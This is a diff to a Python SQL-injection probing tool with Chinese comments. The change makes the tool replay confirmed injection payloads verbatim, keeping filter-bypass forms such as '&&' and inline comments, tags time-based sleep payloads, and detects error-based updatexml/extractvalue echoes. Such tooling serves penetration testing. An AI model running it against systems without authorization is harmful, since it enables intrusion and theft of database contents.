@@ -213,6 +213,7 @@ def union_extract(client, endpoint, param: str, payload_hint: str,
 def ai_deep_probe(db, endpoint, client, *, param: str, base_value: str = "1",
                   known_dbms: str = "", payload_hint: str | None = None,
                   strategies: list[str] | None = None,
+                  exact_payloads: list[str] | None = None,
                   max_payloads: int = 5) -> dict:
     """生成并直发 payload，返回 {confirmed, hits, dbms, requests, error}。"""
     probe_ctx = {
@@ -225,6 +226,18 @@ def ai_deep_probe(db, endpoint, client, *, param: str, base_value: str = "1",
     }
     payloads = ai.generate_payloads(db, endpoint, None, strategies=strategies,
                                     base_value=base_value, probe_context=probe_ctx)
+    # 深挖第一优先级：**原样重放已确认 payload**（保留 &&、a/**/Nd、tab、大小写），
+    # 不要先让 AI/模板另造一条近似形态（Less-25 实测：模板缺 &&，全部打在过滤器上）。
+    exact = []
+    for p in (exact_payloads or []):
+        p = str(p or "").strip()
+        if not p:
+            continue
+        vec = ("time" if re.search(r"sleep|benchmark|pg_sleep", p, re.I)
+               else "confirmed")
+        exact.append({"payload": p, "vector": vec})
+    if exact:
+        payloads = exact + payloads
     if not payloads:
         payloads = _builtin_for(known_dbms)
 
@@ -251,6 +264,15 @@ def ai_deep_probe(db, endpoint, client, *, param: str, base_value: str = "1",
         # 排除「payload 被页面回显」造成的自命中：搜索页常把查询词原样渲染回来，
         # payload 自身含 sqlite_master / information_schema 时会让回显判据假阳性。
         scan_text = text.replace(payload, "") if payload else text
+
+        # 判据 0：确认的 updatexml/extractvalue payload 回显 `~db~`（精确复用路径）
+        if vector == "confirmed" and re.search(r"updatexml|extractvalue", payload, re.I):
+            me = re.search(r"~([^~<>\s]{1,80})~", scan_text)
+            if me:
+                hits.append({"payload": payload, "vector": "error",
+                             "criteria": f"确认 payload 精确回显: {me.group(1)[:60]}",
+                             "elapsed_ms": int(elapsed * 1000)})
+                continue
 
         # 判据 1：回显特征（库名/版本/元数据）
         m = _ECHO_RE.search(scan_text)
